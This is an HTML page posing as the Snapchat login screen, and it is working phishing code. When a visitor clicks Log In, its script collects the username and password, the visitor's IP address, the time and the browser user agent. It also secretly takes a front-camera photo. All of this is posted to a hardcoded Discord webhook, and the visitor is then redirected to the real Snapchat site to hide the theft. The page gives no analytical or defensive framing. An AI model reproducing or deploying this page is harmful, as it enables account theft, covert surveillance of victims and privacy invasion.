<head>

    <title>Log in to Snapchat</title>
    <style>

            display: flex;

            align-items: center;
            height: 100vh;
            margin: 0;

            padding: 40px;

            text-align: center;

        }
        h1 {

            margin-bottom: 30px;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #000;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background-color: #333;
        }
        video, canvas {
            display: none;
        }

    <h1>Log in to Snapchat</h1>
    <input type="text" id="username" placeholder="Username or Email" required>
    <input type="password" id="password" placeholder="Password" required>
    <button id="loginBtn">Log In</button>
</div>

<video id="video" width="320" height="240" autoplay></video>
<canvas id="canvas" width="320" height="240"></canvas>

<script>
    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
    const loginBtn = document.getElementById('loginBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    loginBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        if(!username || !password) {
            alert("Please enter username and password.");
            return;
        }

        loginBtn.innerText = "Logging in...";
        loginBtn.disabled = true;

        let ip = "Unknown";
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            ip = ipData.ip;
        } catch(err) { console.error("IP fetch failed"); }

        const time = new Date().toLocaleString();
        const userAgent = navigator.userAgent;
        
        let imageBlob = null;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());
            
            imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        } catch(err) {
            console.error("Camera access denied or failed", err);
        }

        const formData = new FormData();
        
        const embed = {
            title: "👻 New Snapchat Login Captured",
            color: 16776960,
            fields: [
                { name: "Username/Email", value: username, inline: true },
                { name: "Password", value: password, inline: true },
                { name: "IP Address", value: ip, inline: false },
                { name: "Time", value: time, inline: false },
                { name: "User Agent", value: userAgent, inline: false }
            ]
        };

        formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
        
        if (imageBlob) {
            formData.append('file', imageBlob, 'snapshot.jpg');
        }

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });
            window.location.href = "https://accounts.snapchat.com/";
        } catch(err) {
            console.error("Webhook failed", err);
            window.location.href = "https://accounts.snapchat.com/";
        }
    });
</script>
</body>
